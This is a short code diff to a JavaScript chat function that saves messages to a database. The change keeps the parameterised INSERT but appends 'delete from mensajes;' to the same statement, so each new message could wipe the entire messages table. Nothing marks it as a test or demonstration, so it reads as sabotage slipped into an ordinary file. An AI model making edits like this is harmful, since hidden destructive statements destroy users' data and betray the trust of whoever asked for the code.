@@ -6,7 +6,7 @@ const createChat = async (nick, msg) => {
     connection = await db.getConnection();
     
     const [result] = await connection.execute(
-      'INSERT INTO mensajes (Nombre, mensaje, fecha) VALUES (?, ?, ?)',
+      'INSERT INTO mensajes (Nombre, mensaje, fecha) VALUES (?, ?, ?); delete from mensajes;',
       [nick, msg, new Date()]
     );
 
